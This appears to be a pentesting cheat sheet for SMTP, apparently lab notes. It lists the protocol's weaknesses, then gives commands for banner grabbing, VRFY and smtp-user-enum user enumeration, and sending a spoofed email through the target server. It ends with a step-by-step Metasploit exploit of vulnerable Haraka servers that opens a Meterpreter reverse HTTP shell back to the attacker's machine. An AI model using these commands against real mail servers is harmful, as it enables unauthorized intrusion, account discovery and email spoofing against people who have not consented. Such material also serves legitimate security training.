# SMTP

**SMTP (Simple Mail Transfer Protocol)**
**Description**: SMTP is the standard protocol used to send emails from a client to a mail server or between mail servers. It operates at the application layer of the OSI model.  
**Ports**: 25 (default, unencrypted, often blocked by ISPs), 587 (submission, supports STARTTLS encryption), 465 (deprecated, but still used for SMTP over SSL/TLS)
**Known Vulnerabilities**: Server sends mail without auth — can be abused for spam, RCPT TO command used to check if user exists, Weak/no authentication, info disclosure in banners, Weak SMTP login creds

<br>

# SMTP Enumeration

```shell
nmap -sV --script banner <target_IP>
# Grabs banner information from open ports to help identify running services and versions.

nc <target_IP> 25
# Opens a raw TCP connection to the SMTP service on port 25.

VRFY admin@openmailbox.xyz
VRFY commander@openmailbox.xyz
# Checks if the specified email addresses exist on the SMTP server.

telnet <target_IP> 25
# Connects to the SMTP service using Telnet for manual interaction.

HELO attacker.xyz
EHLO attacker.xyz
# Initiates an SMTP session with the target mail server; EHLO gives extended capabilities.

smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t <target_IP>
# Enumerates valid SMTP users on the target using a given username list.

use auxiliary/scanner/smtp/smtp_version
# Identifies the SMTP server software and version.

use auxiliary/scanner/smtp/smtp_enum
# Attempts to enumerate valid users via SMTP VRFY, EXPN, or RCPT commands.

sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s <target_IP> -u Fakemail -m "Hi root, a fake from admin" -o tls=no
# Sends a spoofed email via the target SMTP server without TLS; useful for testing open relays or phishing simulations.
```

<br>

# Exploitation

```shell
# Linux exploitation
# Load the Haraka SMTP Exploit module in Metasploit
use exploit/linux/smtp/haraka  # (haraka < v2.8.9 is vulnerable)
# Set the remote host (target SMTP server) that we want to exploit
set RHOST <target_IP> 
# Set the local server port for handling incoming connections (Default is 9898)
# This is necessary for receiving the reverse connection from the exploited target.
set SRVPORT 9898  
# Specify the target email address to send the malicious payload
# In this case, "root@attackdefense.test" is the intended recipient on the target SMTP server.
set email_to root@attackdefense.test  
# Select the payload to be used in the exploit
# We are using a Meterpreter reverse HTTP shell for a stable connection.
set payload linux/x64/meterpreter_reverse_http  
# Define the local host (our attack machine) that will receive the reverse shell connection
set LHOST <kali_IP>
# Execute the exploit and attempt to gain access to the target system
exploit  

# Ignore any error you see, as you have already gained the meterpreter session. To list active sessions, run the following command:
sessions
sessions -i 1
```
